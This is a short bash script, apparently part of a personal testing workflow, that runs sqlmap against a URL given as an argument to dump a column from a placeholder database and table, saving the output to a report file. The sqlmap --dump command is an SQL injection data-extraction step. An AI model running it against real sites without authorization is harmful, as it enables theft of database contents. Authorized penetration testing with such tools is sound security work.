#!/bin/bash

url="$1"
ruta_salida4="/home/datanetworkoverlock/Escritorio/REPORTE/salida_SQLmap4.txt"
script -c "sqlmap -u "$url" -D dbname -T tablename -C columnname --dump" $ruta_salida4